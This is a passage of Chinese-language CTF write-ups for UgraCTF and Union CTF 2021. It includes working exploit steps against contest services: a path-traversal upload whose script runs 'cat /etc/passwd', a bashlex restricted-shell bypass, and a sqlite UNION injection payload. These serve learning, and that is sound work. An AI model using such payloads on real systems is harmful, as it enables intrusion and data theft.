        <content type="html"><![CDATA[<h3 id="Антивирус-Antivipyc"><a href="#Антивирус-Antivipyc" class="headerlink" title="Антивирус Antivipyc"></a>Антивирус Antivipyc</h3><blockquote><p>Югорские разработчики создали новый облачный антивирус, с больщой точностью определяющий вредоносные приложения. Но хорошо ли протестирован сам антивирус?</p><p>Ugra 开发人员开发了一种新的云防病毒软件，可以高度准确地检测恶意程序。 但是防病毒软件本身是否经过了良好的测试？</p></blockquote><p>环境给出的是一个上传的表单，尝试上传发现会有文件正常和恶意文件两种反馈。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/639ec06e-c421-456e-b634-e2e7145e132b/1614576494814.353cc892e6371db202db4ba24070ca6d77203277.png" alt="image-20210301132813685"></p><p>上传一个源代码文件可发现网页响应时间较久，推测代码在被检测的过程中被执行了。尝试将表单中的 ext 参数改为 py 后随便上传一个 Python 脚本发现响应如下。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Не удалось проверить файл &#x2F;tmp&#x2F;uploads&#x2F;1.py: плагин &#x2F;app&#x2F;plugins&#x2F;py.py не найден</span><br></pre></td></tr></table></figure><p>报错给出了上传文件的路径 <code>/tmp/uploads/1.py</code> 。此时的拓展名被拼接到了文件名后面形成了 <code>/app/plugins/py.py</code>，此时如果使用目录穿越，则可以执行其他的文件。构造一波目录穿越，使得其后缀为 <code>../../tmp/uploads/1</code>，此时得到的文件名就是 <code>/app/plugins/../../tmp/uploads/1.py</code>。在上传的文件中构造如下脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;cat /etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure><p>将其作为源代码文件上传即可得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_who_checks_the_checker_b48847d6ef8eНе удалось проверить файл &#x2F;tmp&#x2F;uploads&#x2F;1.py</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_who_checks_the_checker_b48847d6ef8eНе</span><br></pre></td></tr></table></figure><h3 id="Книга-пути-и-достоинства-daodejing"><a href="#Книга-пути-и-достоинства-daodejing" class="headerlink" title="Книга пути и достоинства daodejing"></a>Книга пути и достоинства daodejing</h3><blockquote><p>Китайская мудрость утверждает, что, чтобы не сбиться с трудного пути, необходимо употреблять достаточное количество одного витамина. Не собьётесь?</p></blockquote><p>题目给出的附件中可以得到如下信息（太长了放在了 Ubuntu Pastebin）。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;paste.ubuntu.com&#x2F;p&#x2F;NsTsDFrszc&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p>SVG Path</p><ul><li>M = moveto</li><li>L = lineto</li><li>H = horizontal lineto</li><li>V = vertical lineto</li><li>C = curveto</li><li>S = smooth curveto</li><li>Q = quadratic Belzier curve</li><li>T = smooth quadratic Belzier curveto</li><li>A = elliptical Arc</li><li>Z = closepath</li></ul><p>以上所有命令均允许小写字母。大写表示绝对定位，小写表示相对定位。</p></blockquote><p>将 SVG 文件补充完整。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; standalone&#x3D;&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; </span><br><span class="line">&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot; version&#x3D;&quot;1.1&quot;</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;path d&#x3D;&quot;&#123; FILE CONTENT &#125;&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><p>使用浏览器打开可以得到如下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/639ec06e-c421-456e-b634-e2e7145e132b/1614768976525.90ea50d09218be46fd81d6e0b81ec2ca43cc8551.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_grandpa_take_your_pills_or_we_will_beat_up_your_61e33e4865869f4c</span><br></pre></td></tr></table></figure><h3 id="ЦНИИВТ"><a href="#ЦНИИВТ" class="headerlink" title="ЦНИИВТ"></a>ЦНИИВТ</h3><blockquote><p>Устроился системным администратором в Центральный НИИ вычислительной техники. На второй неделе работы обнаружил в локальной сети какой-то странный компьютер. Поспрашивал у коллег — все впервые слышат о нём, даже не знают, на каком этаже он стоит.</p><p>Искал пару дней, в итоге нашёл его в подсобке под слоем пыли — такое ощущение, что лет 30 к нему никто не прикасался. Самое удивительное — это то, что он каким-то образом подключен к интернету, и на нём даже открыт порт. При подключении просит пароль, я его раздобыл в архиве. Но вместо данных сервер шлёт какой-то мусор.</p><p>Поможете разобраться? Вдруг там что-то важное!</p><ul><li>Пароль: <code>9bd0f869bb947165bd66ba2e7f5a5aeb</code></li></ul></blockquote><p>写个脚本把控制台发送的内容接收回来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">connection = remote(<span class="string">&quot;soviet.q.2021.ugractf.ru&quot;</span>, <span class="number">17792</span>)</span><br><span class="line">connection.recvline()</span><br><span class="line">connection.sendline(<span class="string">&quot;9bd0f869bb947165bd66ba2e7f5a5aeb&quot;</span>)</span><br><span class="line">content = connection.recvall()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;out.bin&quot;</span>, <span class="string">&quot;bw&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ÛßßßßßÛ ß Ûß  ÜÜß ÜÜßÛÛßÜÜÛ ÜßÜ Û ÛßßßßßÛÛ ÛÛÛ Û ßßÛÜßßßÜ ß ÛÜ ßÛÛß    Üß  Û ÛÛÛ ÛÛ ßßß Û ß  ßßÜß ÜßÜÛ  ß Üß ßÛßÜßÛ Û ßßß Ûßßßßßßß Û ÛÜÛ ßÜÛÜßÜÛÜÛ ßÜß Û ß Û ßßßßßßß  Ü ÜÛßÜÜÛß ßßÛ ßß ßÛßßÜßÜÛÛ ßÜÜ  ßÜÛÜÛ ßÜÜ ßÜßßÛßÜÛÛÛßÜßßßÜÛÜÜÛßÛÛ ßÜßßÜÜß Ü Û  Ü ÛÜ ß ßßÛ ÜÜßÛßÜÛ ÜßÛÜßÜÛÛÜß ß ßÛßßÛÜßÜÜÛÜÛÛÛ ÜßÛÛß ßÛÛ ÛÜßÛßÛÛ ÛÛ  ßÛßÜÛ ÜßÜßÜÜÜÜßßÜÛßßßÛÛß   ÜÛ ßÛÛßÛßÜ ÜÜßÛßÛßßßÜÜßÛÜß ÜÜÛ  Û ßÛßÜÛÛÜÜß Ü ÛßÛ ÜßÜßÜÛÛÜÜÜÜÜÜ ÛÛßÜÛ  ßÛß ßÛÛÜßßßÛÛÛÜ ÛÛÛ ÛßÛ ßÛ  ÜÛ   ß ÜÛÛß Ü ÜÛßß ßßÜÜ ÜÛ  Û ß  Ü ßÛ ß  Ü ßÛ ÛÛ  Ü  ßÜ  ßßÜÛÜßÜÜßÜÜÜÜÜÜßß ßß  ÛÜÜßÜ  ÛÛÜÜ ßÛÜÛÜßÛÛßÜ ßÜÜÛÛ Û  ÜÜÛÛß Ü ßÛßß Üß ß ÜÛÛÜÜÜÜÛÛßÛßÜ   ß Ü ßÛÜÛßßÛß     ÜÛÜßß ßÜÜÛÛ ÜÛßßÜßÜßÜÛßßÜ   Ûß ÜßßÛÛßÛ  ÜÛßßß ÛÛÜ Û ÜÛß     ß ÛßßÜ ß ÜÛ ÜÛßÛÜ Ü  ÜÛßßÜÛßßßÛÜÛ ßÛßßßßßÛ ÜßÛßÛÜÜÜßßÛÜßÜÜÛ ßÜß  ßÜÛ ß ÛÛ Ü Û ÛÛÛ Û  Ü ÜßÜß ÜÛÛß  ÛÜ Ü ÜÜßßßßÛßßß  ÜÛÛ ßßß Û  ÜÛßÛßßÛ ßÛÛ  ßÛÛÜÜßÛ ÜßßÛÛßß ÛßÜßßßßßßß  ßßßß     ßßßß ß ßßßß  ß  ß ßßß  </span><br></pre></td></tr></table></figure><p>总共有 861 个字符，很容易求得其两个真约数为 21、41。猜测其是一个二维码，修改脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">connection = remote(<span class="string">&quot;soviet.q.2021.ugractf.ru&quot;</span>, <span class="number">17792</span>)</span><br><span class="line">connection.recvline()</span><br><span class="line">connection.sendline(<span class="string">&quot;9bd0f869bb947165bd66ba2e7f5a5aeb&quot;</span>)</span><br><span class="line">content = connection.recvall()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Recieved &#123;&#125;&quot;</span>.<span class="built_in">format</span>(content))</span><br><span class="line">content = content.replace(<span class="string">b&quot;\xdb&quot;</span>, <span class="string">b&quot;\xe2\x96\x88&quot;</span>) <span class="comment"># █</span></span><br><span class="line">content = content.replace(<span class="string">b&quot;\xdf&quot;</span>, <span class="string">b&quot;\xe2\x96\x80&quot;</span>) <span class="comment"># ▀</span></span><br><span class="line">content = content.replace(<span class="string">b&quot;\xdc&quot;</span>, <span class="string">b&quot;\xe2\x96\x84&quot;</span>) <span class="comment"># ▄</span></span><br><span class="line">content = content.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Content parsed as &#123;&#125;&quot;</span>.<span class="built_in">format</span>(content))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">    <span class="built_in">print</span>(content[x * <span class="number">41</span> : (x + <span class="number">1</span>) * <span class="number">41</span>])</span><br></pre></td></tr></table></figure><p>可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">█▀▀▀▀▀█ ▀ █▀  ▄▄▀ ▄▄▀█▄▀█ █ ▄▀▄ █ █▀▀▀▀▀█</span><br><span class="line">█ ███ █ ▀▀█▄▀▀▀▄ ▀ █▄ ▀█▄▀    ▄▀  █ ███ █</span><br><span class="line">█ ▀▀▀ █ ▀  ▀▀▄▀ ▄▀▄█▀█▀ ▄▀ ▀█▀▄▀█ █ ▀▀▀ █</span><br><span class="line">▀▀▀▀▀▀▀ █ █▄█ ▀▄█▄▀▄█▄█ ▀▄▀ █ ▀ █ ▀▀▀▀▀▀▀</span><br><span class="line">  ▄ ▄█▀▄▄█▀ ▀▀█ ▀▀ ▀█▀▀▄▀▄██ ▀▄▄  ▀▄█▄█ ▀</span><br><span class="line">▄▄ ▀▄▀▀█▀▄███▀▄▀▀█▄█▄▄█▀██ ▀▄▀▀▄▄▀ ▄ █  ▄</span><br><span class="line"> █▄ ▀ ▀▀█ ▄▄▀█▀▄█ ▄▀█▄▀▄█▀▄▀ ▀ ▀█▀▀█▄▀▄▄█</span><br><span class="line">▄███ ▄▀█▀▀ ▀██ █▄▀█▀█▀▀█▀  ▀█▀▄█ ▄▀▄▀▄▄▄▄</span><br><span class="line">▀▀▄█▀▀▀██▀   ▄█ ▀██▀ ▀▄ ▄▄▀█▀█▀█▀▄▄██▄▀ ▄</span><br><span class="line">▄█▀ █ ▀█▀ ██▄▄▀ ▄ █▀█ ▄█▄ ▄██▄▄█▄▄▄ ███▄█</span><br><span class="line">  ▀▀▀ ▀▀█▄▀▀▀███▄ ███ █▄█ ▀█  ▄█  ▄▀▄▄█▀ </span><br><span class="line"> ▄ ▄█▀  ▀▀▄▄ ▄█  █ ▀▀ ▄ ▀█ █    ▀█ █▄  ▄ </span><br><span class="line"> ▀▄  ▀▀▄█▄ ▄▄▀▄▄▄▄▄▄▀▀ ▀█  █▄▄ ▄▄ ██▄▄ ▀█</span><br><span class="line">▄█▄▀██▀▄ ▀▄▄██ █  ▄▄█▀▀ ▀ ▀█▀▀ ▄▀ ▀ ▄██▄▄</span><br><span class="line">▄███▀▀▀▄   ▀▀▄▄██▄██▀█▀ ▄   ▄█▄▀▀ ▀▄▄██ ▄</span><br><span class="line">█▀▀▄▀▄▀▄█▀▀▄   █▀ ▄▀▀██▀█  ▄█▀▀▀ ██▄ █ ▄█</span><br><span class="line">▀     ▀ █▀▀▄ ▀ ▄█ ▄█ █▄ █  ▄█▀▀▄█▀▀▀█▄█ ▀</span><br><span class="line">█▀▀▀▀▀█ ▄▀█▀█▄▄▄▀▀█▄▀▄▄█ ▀▄▀  ▀▄█ ▀ ██ ▄ </span><br><span class="line">█ ███ █  ▄ ▄▀▄▀ ▄██▀  █▄ ▄ ▄▄▀▀▀▀█▀▀▀  ▄█</span><br><span class="line">█ ▀▀▀ █  ▄█▀█▀▀█▀▀██ ▄▀██▄▄▀█ ▄▀▀██▀▀ █▀▄</span><br><span class="line">▀▀▀▀▀▀▀  ▀▀▀▀     ▀▀▀▀ ▀ ▀▀▀▀  ▀  ▀ ▀▀▀  </span><br></pre></td></tr></table></figure><p>Word 稍微排一下，可以得到如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/639ec06e-c421-456e-b634-e2e7145e132b/1614774910974.3cd9144c9e0716b0caa2a5e319b3ad9191a9c9ec.png@256w.png"></p><p><code>Parse QR Code</code> 即可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_soviet_technologies_are_eternal_369863efd250</span><br></pre></td></tr></table></figure><h3 id="Новейшая-разработка-developers"><a href="#Новейшая-разработка-developers" class="headerlink" title="Новейшая разработка developers"></a>Новейшая разработка developers</h3><blockquote><p>Это исходный код программного обеспечения, разработанного очень крутыми разработчиками. Но иногда и они допускают ошибки. Ну так, по невнимательности.</p><p>这是非常出色的开发人员开发的软件的源代码。 但是有时候他们也会犯错误。 好吧，无意间。</p></blockquote><blockquote><p>考点： <a href="https://git-scm.com/docs/git-fsck">https://git-scm.com/docs/git-fsck</a></p></blockquote><p>使用 git fsck 可以 dangling 出一个 commit。此时查看相关 commit 可得到 flag。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">commit 7f3b10fd4fdf9a74cab201e4f3f8ece5cf9e4833</span><br><span class="line">Author: Validian &lt;validian@validian.name&gt;</span><br><span class="line">Date:   Wed Dec 11 06:00:30 2019 +0845</span><br><span class="line"></span><br><span class="line">    added info.txt.</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/info.txt b/info.txt</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 0000000..d3849f0</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/info.txt</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,7 @@</span></span><br><span class="line"><span class="addition">+If you are reading this, I am definitely dead by now.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+I also know that by reaching this file, you have demonstrated</span></span><br><span class="line"><span class="addition">+the best of your ability and courage. Here is the key to my</span></span><br><span class="line"><span class="addition">+lifetime secret: ugra_the_yellow_purse_6f557934d3d1f541</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+You will understand what to do next. Good luck!</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ugra_the_yellow_purse_6f557934d3d1f541</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Union CTF 2021</title>
      <link href="/zh-CN/posts/17a1c7f0.html"/>
      <url>/zh-CN/posts/17a1c7f0.html</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="👑-Welcome-👑"><a href="#👑-Welcome-👑" class="headerlink" title="👑 Welcome 👑"></a>👑 Welcome 👑</h3><p>Rules 里面可以找到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;r0p_s4v3_the_que3n&#125;</span><br></pre></td></tr></table></figure><h3 id="bashlex"><a href="#bashlex" class="headerlink" title="bashlex"></a>bashlex</h3><blockquote><p>We made a new restricted shell with fancy AST validation, and we don’t allow <code>cat</code>!</p><p>The flag is in <code>/home/bashlex/flag.txt</code>.</p></blockquote><p>给出的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bashlex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ALLOWED_COMMANDS = [<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate</span>(<span class="params">ast</span>):</span></span><br><span class="line">    queue = [ast]</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        node = queue.pop(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> node.kind == <span class="string">&#x27;command&#x27;</span>:</span><br><span class="line">            first_child = node.parts[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> first_child.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> first_child.parts:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Forbidden top level command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.startswith((<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Path components are forbidden&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">elif</span> first_child.word.isalpha() <span class="keyword">and</span> \</span><br><span class="line">                        first_child.word <span class="keyword">not</span> <span class="keyword">in</span> ALLOWED_COMMANDS:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;Forbidden command&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;commandsubstitution&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Command substitution is forbidden&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> node.kind == <span class="string">&#x27;word&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;[&#x27;</span>] <span class="keyword">if</span> c <span class="keyword">in</span> node.word]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Wildcards are forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> node.word:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag is forbidden&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Add node children</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;parts&#x27;</span>):</span><br><span class="line">            queue += node.parts</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(node, <span class="string">&#x27;list&#x27;</span>):</span><br><span class="line">            <span class="comment"># CompoundNode</span></span><br><span class="line">            queue += node.<span class="built_in">list</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    inp = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parts = bashlex.parse(inp)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> parts:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> validate(p):</span><br><span class="line">                valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;INVALID&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    subprocess.call([<span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, inp])</span><br></pre></td></tr></table></figure><p>首先看一下 bashlex 的抽取逻辑，以 ls 这条指令为例。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CommandNode(parts&#x3D;[WordNode(parts&#x3D;[] pos&#x3D;(0, 2) word&#x3D;&#39;ls&#39;)] pos&#x3D;(0, 2))]</span><br></pre></td></tr></table></figure><p>CommandNode 里包括 WordNode，每个 Node 包括 pos 和 parts。所以此时的规则大概是指令中不能含有变量、不能以路径开头、如果是纯字母的指令则不允许白名单以外的指令。同时不可以使用 bash 的指令替代（但是这点有点迷惑）。所以只需要找到一个非纯字母组成的指令即可。这里因为是 python 的环境。于是有 python3 的指令可以被成功执行。由于没有回显，所以尝试开个 http 服务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure><p>此时访问到<a href="http://34.90.44.21:2333/home/bashlex/flag.txt">这里</a>可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;chomsky_go_lllllllll1&#125;</span><br></pre></td></tr></table></figure><p>看到大佬的一种解法是用的指令替代，但是要使用双数反引号去替代。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;`ls`</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[CommandsubstitutionNode(<span class="built_in">command</span>=CommandNode(parts=[WordNode(parts=[] pos=(1, 3) word=<span class="string">&#x27;ls&#x27;</span>)] pos=(1, 3)) pos=(0, 4))] pos=(0, 4) word=<span class="string">&#x27;`ls`&#x27;</span>)] pos=(0, 4))] <span class="comment">#此时因为被 bashlex 正确解析无法通过检测</span></span><br><span class="line">&gt;``ls``</span><br><span class="line">[CommandNode(parts=[WordNode(parts=[] pos=(0, 6) word=<span class="string">&#x27;``ls``&#x27;</span>)] pos=(0, 6))] <span class="comment">#此时解析出来只有一个 WordNode，可以正常执行</span></span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Meet-the-Union-Committee"><a href="#Meet-the-Union-Committee" class="headerlink" title="Meet the Union Committee"></a>Meet the Union Committee</h3><blockquote><p>A committee was formed last year to decide the highly-sensitive contents of our challenges. All we could find is their profiles on this website. They are super paranoid that their profile site is hackable and decided to implement insane rate limits. Really we need to get access to the admin’s password. If only that was possible.</p></blockquote><p>随便点进一个人的主页可以发现 URL 多了个 GET 参数 id。尝试下发现存在 SQL 注入，且可以发现如下报错。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;unionflaggenerator.py&quot;, line 49, in do_GET</span><br><span class="line">    cursor.execute(&quot;SELECT id, name, email FROM users WHERE id&#x3D;&quot; + params[&quot;id&quot;])</span><br><span class="line">sqlite3.OperationalError: near &quot;‘&quot;: syntax error</span><br></pre></td></tr></table></figure><p>可以发现数据库采用的是 sqlite3。尝试构造语句读取 sqlite_master 里的 sql 以得出数据库中表的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(sql),3%20from%20sqlite_master--+</span><br></pre></td></tr></table></figure><p>可以得到如下回显。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, email TEXT, password TEXT),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)</span><br></pre></td></tr></table></figure><p>于是根据题目描述，尝试读取表中的密码字段，即 users 表下的 password。</p><figure 